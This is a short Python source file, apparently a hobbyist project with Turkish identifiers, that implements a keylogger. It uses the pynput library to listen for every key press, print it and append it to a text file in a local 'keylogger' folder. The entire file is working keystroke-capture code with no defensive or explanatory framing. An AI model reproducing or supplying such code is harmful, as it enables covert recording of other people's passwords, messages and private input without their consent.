from pynput import keyboard

def tusaBasildiginda(tus):
    try:
        print("Basılan tuş: {0}".format(tus.char))
        dosya= open("//Users//erayasar//Desktop//keylogger//basilanTuslar.txt","a")
        dosya.write(tus.char)
    except AttributeError:
        print("Basılan tuş: {0}".format(tus))
        dosya= open("//Users//erayasar//Desktop//keylogger//basilanTuslar.txt","a")
        dosya.write("\n"+str(tus)+"\n")

def tusBirakildiginda(tus):
   # print("bırakılan tuş: {0}".format(tus.char))
    pass
with keyboard.Listener(on_press=tusaBasildiginda, on_release= tusBirakildiginda) as dinleyici:
    dinleyici.join()

dinleyici = keyboard.Listener(on_press=tusaBasildiginda, on_release=tusBirakildiginda)
dinleyici.start()